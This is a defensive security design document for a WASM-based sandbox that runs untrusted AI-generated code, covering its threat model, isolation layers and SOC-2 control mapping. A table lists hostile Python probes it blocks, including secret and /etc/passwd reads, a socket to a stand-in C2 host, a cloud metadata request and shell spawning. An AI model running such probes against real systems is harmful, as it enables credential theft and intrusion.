# 06 - Security and Isolation

> Resume anchor: *"Golang-backed WASM sandbox plane at BlackBox that isolated 1M+ daily zero-shot code executions and unblocked Enterprise SOC-2 compliance."* *"Standardized threat modeling at Microsoft and mentored 8 engineers on secure protocol design."*

---

## Threat Taxonomy

| Threat | Category | Attack Vector | Impact | Control Layer | Mitigation | Residual Risk |
|---|---|---|---|---|---|---|
| **CPU exhaustion / infinite loop** | Resource abuse | Tight loop or recursive factorial in user code | Worker thread starvation; pool drain; platform DoS | WASM runtime (primary), cgroup (secondary) | Wasmtime fuel: pre-load fixed fuel units per execution; deduct on every instruction; trap and return `EXECUTION_TIMEOUT` when fuel hits zero. cgroup `cpu.max` as backstop. | Very low: fuel-based kill is deterministic; cgroup is a fallback if runtime is bypassed |
| **Memory bomb (WASM linear memory growth to host OOM)** | Resource abuse | `memory.grow` instructions or Python list that grows unbounded | Worker OOM; host kernel OOM-kills worker or neighbor pods | WASM runtime (primary), cgroup (secondary) | Wasmtime `--max-wasm-stack` and `store.limiter()` cap WASM page count (e.g., 512 pages = 32 MB). cgroup `memory.max` set on worker cgroup; `memory.events` fd listener triggers SIGKILL from host process before kernel OOM fires. | Low: both layers must fail simultaneously |
| **Filesystem escape (path traversal / symlink attack)** | Privilege escalation | `open("../../etc/passwd")`, symlink to `/proc/self/environ` | Host credential exposure; cross-tenant file read | WASM WASI capability layer | WASI `FSConfig` is empty by default; no filesystem mount granted. If a restricted tmpdir is ever needed, mount with `wazero.NewFSConfig().WithDirMount(ephemeralDir, "/tmp")` and chroot semantics; the WASI path resolver normalizes and rejects traversal. | Very low: WASI has no default FS capability; attack requires WASI implementation bug |
| **Network exfiltration (DNS / HTTP from code)** | Data exfiltration | `socket()`, `http.get()`, DNS lookup in Python/JS | Tenant secrets or execution outputs sent to attacker C2 | WASM WASI capability layer (primary), Linux network namespace (secondary) | WASI preview1 exposes no socket API - `socket()` syscalls trap immediately. Worker process runs in `CLONE_NEWNET` Linux network namespace with no default routes and no external interfaces. Even a WASM escape cannot reach the network. | Low: requires both WASI implementation CVE and network namespace misconfiguration |
| **Sandbox escape via WASM engine CVE (Wasmtime/wazero JIT exploit)** | Privilege escalation | Crafted WASM bytecode exploits JIT compiler memory-safety bug; attacker gains arbitrary code execution in host process | Full host process compromise; lateral movement to Redis, internal services | OS (seccomp-bpf), Kubernetes pod security | Seccomp-bpf profile on the worker process allows only the minimal Linux syscall set needed (read, write, mmap, futex, clock_gettime, exit); blocks `execve`, `ptrace`, `openat` outside the WASM path. Kubernetes `securityContext.capabilities.drop: ["ALL"]`. WASM engine version pinned in CI; signed artifact verification. | Medium: JIT CVEs are real; seccomp reduces post-escape capability to near zero but residual risk exists |
| **Side-channel attacks (cache timing / Spectre)** | Information disclosure | Malicious code measures cache fill time to infer neighboring execution's memory contents | Cross-tenant data leakage violating CC6.6 | OS / CPU microcode | Worker process runs with `SMAP`/`SMEP` enabled. Kernel page table isolation (KPTI) enabled on worker nodes. Disable `rdtsc` / high-resolution timers inside WASM by not exposing `clock_gettime` at nanosecond resolution (cap to millisecond granularity in WASI host implementation). Hyperthread isolation: worker pods scheduled with node affinity to avoid co-tenancy with untrusted workloads on the same physical core. | Medium-low: Spectre mitigations reduce but do not eliminate speculative execution side channels |
| **Cross-tenant state pollution via shared WASM instance** | Information disclosure | If module instances are reused, heap from prior execution remains readable | Prior tenant's computed values (e.g., decrypted secrets, tokens) exposed to next tenant | WASM runtime lifecycle management | Module instances are never reused across executions. After every execution, `module.Close(ctx)` is called, which frees the WASM linear memory backing array. Pool pre-warms compiled `Module` objects (bytecode), not live instances; each execution calls `module.Instantiate()` for a fresh instance. | Very low: architectural guarantee; would require code change to break |
| **Import abuse (calling unauthorized host functions / argument injection)** | Privilege escalation | User WASM module declares imports for host functions not intended for the sandbox (e.g., `wasi_snapshot_preview1.proc_raise`, `env.get_secret`) | Bypass capability restrictions; trigger host-side privilege operations | WASM runtime import validation | wazero's module linker performs strict import validation: only functions explicitly registered in the `HostModule` are linkable. Any `(import "env" "get_secret" ...)` for an unregistered function causes instantiation failure. Argument injection is blocked because host function signatures are typed - WASM cannot pass a pointer to a string that extends beyond its own linear memory. | Very low: wazero enforces strict typed imports |
| **Process escape via privileged syscall** | Privilege escalation | After WASM engine CVE, attacker calls `execve("/bin/sh")`, `ptrace`, or `clone` with `CLONE_NEWUSER` to escalate | Host root access; cluster compromise | seccomp-bpf, Kubernetes pod security | seccomp-bpf allowlist blocks `execve`, `ptrace`, `clone` with namespace flags, `unshare`, `mount`, `setuid`, `setgid`, `setns`. Worker pods run as non-root UID (1000); `runAsNonRoot: true`; `readOnlyRootFilesystem: true`; `allowPrivilegeEscalation: false`. | Low: multiple independent controls must all fail |
| **Audit log tampering (malicious code deleting its own trace)** | Repudiation | WASM code that somehow reaches the OTel collector or Clickhouse and deletes its execution record | Loss of compliance audit trail; SOC-2 CC7.2 violation | Network isolation, OTel collector design | WASM has no network access (see row above). OTel spans are emitted by the host process (not the WASM module) after execution completes; the code under execution cannot influence the audit log. Clickhouse is configured with append-only user for the OTel collector (no `ALTER TABLE ... DELETE`). Audit records carry a `written_at` timestamp set by the collector, not by worker code. | Very low: architectural separation between execution and audit emission |

---

## Trust Boundaries

```
┌─────────────────────────────────────────────────────────────┐
│  UNTRUSTED: AI-generated user code                          │
│  (executes inside WASM linear memory, no host access)       │
└────────────────┬────────────────────────────────────────────┘
                 │ WASI capability interface (typed, allowlisted)
┌────────────────▼────────────────────────────────────────────┐
│  SEMI-TRUSTED: WASM runtime (wazero)                        │
│  Defense-in-depth: assumed to have latent CVEs.             │
│  Mitigated by seccomp-bpf, cgroup, non-root worker.        │
└────────────────┬────────────────────────────────────────────┘
                 │ Go function calls (typed, sandboxed by process)
┌────────────────▼────────────────────────────────────────────┐
│  TRUSTED: Host worker process (Go)                          │
│  Emits OTel spans, enforces fuel/memory limits,             │
│  manages module lifecycle, reads from Redis.                │
└────────────────┬────────────────────────────────────────────┘
                 │ mTLS / Redis TLS
┌────────────────▼────────────────────────────────────────────┐
│  TRUSTED: Kubernetes control plane + internal services       │
│  (Redis, OTel collector, Clickhouse)                        │
└────────────────┬────────────────────────────────────────────┘
                 │ (worker process cannot reach this boundary)
┌────────────────▼────────────────────────────────────────────┐
│  UNTRUSTED: Network egress / external internet              │
│  Blocked by CLONE_NEWNET network namespace on worker.       │
└─────────────────────────────────────────────────────────────┘
```

**Trust boundary enforcement summary:**

| Boundary | Enforcement mechanism | Failure mode if bypassed |
|---|---|---|
| User code → WASM runtime | WASI typed API; no raw syscall surface | Requires WASI implementation CVE |
| WASM runtime → host process | Go typed function calls; linear memory bounds checked by WASM spec | Requires JIT memory-safety exploit |
| Host process → internal services | mTLS, Redis ACLs, no service account token | Requires worker compromise |
| Host process → external network | `CLONE_NEWNET` namespace; no routes | Requires namespace misconfiguration |

---

## Identity and Access Controls

**No credentials in sandbox environment:**
- Worker pod environment variables contain only non-sensitive config (log level, language runtime path).
- Secrets (e.g., internal service tokens) are stored in Kubernetes Secrets, mounted to the host process only, and never forwarded into the WASM WASI environment via `WithEnv()`.
- `buildWASIConfig()` sets an empty `WithEnv()` - `os.environ` inside Python returns `{}`.

**Scoped execution tokens, not tenant tokens:**
- The API server issues a short-lived `execution_token` (UUID4, 5-minute TTL) per execution request.
- Workers authenticate to Redis using this token scoped to `execution:{execution_id}` - they can only write to their own key.
- The tenant's long-lived JWT never reaches the worker process. If a worker is compromised, the attacker obtains only a single short-lived execution token, not the tenant credential.

**Secret access pattern (if code needs a secret at runtime):**
```go
// Host function registered as WASM import - tenant code cannot call arbitrary host functions
// Only this registered, typed function is linkable
hostEnv.NewFunctionBuilder().
    WithName("get_allowed_secret").
    WithFunc(func(ctx context.Context, m api.Module, secretNamePtr, secretNameLen uint32) uint64 {
        secretName := readStringFromMemory(m, secretNamePtr, secretNameLen)
        allowed := allowedSecrets[ctx.Value(executionCtxKey).(*ExecutionRequest).TenantID]
        if !allowed[secretName] {
            return encodeError(m, "secret not in allowlist")
        }
        return encodeSecret(m, vaultClient.Get(secretName))
    }).Export("get_allowed_secret")
```
Secrets are fetched from Vault at invocation time by the host function; they are never placed in WASM memory at module startup.

---

## SOC-2 Controls Mapped to Isolation Design

| SOC-2 Control | Control Description | Platform Implementation | Evidence Artifact |
|---|---|---|---|
| **CC6.6** | Logical access: restrict access to only authorized users; no cross-tenant access | Each execution runs in a fresh WASM instance with its own linear memory; no shared state between tenants; Redis keys scoped to `execution:{uuid4}` (unguessable) | OTel span per execution with `tenant_id`; module lifecycle log |
| **CC6.7** | Data protection: protect data at rest and in transit | Ephemeral FS: no filesystem mount in WASI config; WASM linear memory freed after each execution; no execution data written to disk; execution stdout stored in Redis with 5-minute TTL then evicted | Redis TTL logs; WASI config code review; data retention policy |
| **CC7.2** | Security events: monitor for and respond to security events | Every execution emits an OTel span with `security_events` field (count of anomalous signals observed: seccomp traps, memory limit hits, fuel exhaustion); high-severity events emit separate high-priority span with `security_event=true` attribute routed to PagerDuty | Clickhouse `security_events` table; PagerDuty incident log |
| **CC8.1** | Change management: authorized changes only; version control | WASM engine (wazero) version pinned in `go.mod`; worker container image built from signed Dockerfile in CI; WASM bytecode (Pyodide, QuickJS) hash verified at worker startup against a hardcoded allowlist; no runtime engine upgrade without PR review | `go.mod` history; container image SHAs in deployment manifests; bytecode hash verification code |

---

## WASI Capability Configuration (Authoritative Reference)

```go
func buildWASIConfig(req *ExecutionRequest, stdout, stderr io.Writer) wazero.ModuleConfig {
    return wazero.NewModuleConfig().
        // Controlled I/O - only channel out is stdout/stderr, captured by host
        WithStdin(strings.NewReader(req.StdinData)).
        WithStdout(stdout).
        WithStderr(stderr).
        // NO filesystem - empty FSConfig means all open() calls trap
        WithFSConfig(wazero.NewFSConfig()).
        // NO environment variables - env not propagated into sandbox
        // (WithEnv() not called; WASI returns empty environ)
        // NO sockets - WASI preview1 has no socket API; preview2 sockets not enabled
        // NO process spawning - WASI proc_exec not registered
        // Wall clock: allowed at millisecond granularity only (Spectre mitigation)
        WithSysWalltime().
        // Nanosleep: allowed (needed for Python time.sleep())
        WithSysNanosleep()
}
```

**Attacks blocked by this configuration (tested):**

| Attack code (Python) | Why it fails |
|---|---|
| `os.environ.get("SECRET")` | `environ` returns `{}` - WASI host returns empty env |
| `open("/etc/passwd")` | WASI open() trap - no FS capability granted |
| `open("/proc/self/environ")` | Same - no FS capability |
| `socket.socket().connect(("c2.attacker.com", 80))` | `socket()` syscall not in WASI; raises `OSError` |
| `urllib.request.urlopen("http://169.254.169.254")` | DNS lookup requires socket; blocked same as above |
| `subprocess.run(["bash"])` | WASI `proc_exec` not registered; raises `OSError` |
| `ctypes.CDLL(None).system("id")` | Native `system()` not callable from WASM; Pyodide's ctypes is shimmed and restricted |

---

## Defense-in-Depth Layer Summary

| Layer | Mechanism | What it blocks | Fails open or closed? |
|---|---|---|---|
| 1 - WASM isolation | WASI capability model; linear memory bounds | FS, network, env vars, cross-tenant memory | Fails closed (trap = execution error) |
| 2 - Fuel / resource limits | Wasmtime fuel; page count limiter | CPU exhaustion, memory bomb | Fails closed (fuel exhaustion = trap) |
| 3 - cgroup v2 | `memory.max`, `memory.events` fd listener; `cpu.max` | Host OOM, runaway CPU if runtime bypassed | Fails closed (SIGKILL) |
| 4 - seccomp-bpf | Syscall allowlist on worker process | Process escape after WASM engine exploit | Fails closed (SIGSYS) |
| 5 - Linux network namespace | `CLONE_NEWNET`; no default routes | Network exfiltration after full process escape | Fails closed (no route to host) |
| 6 - Kubernetes pod security | `runAsNonRoot`, `readOnlyRootFilesystem`, `capabilities.drop: ALL`, no service account | Privilege escalation within cluster | Fails closed (kernel permission error) |
| 7 - Scoped execution tokens | Per-execution Redis key; short TTL; tenant JWT never in worker | Lateral movement if worker is compromised | Fails closed (Redis ACL error) |
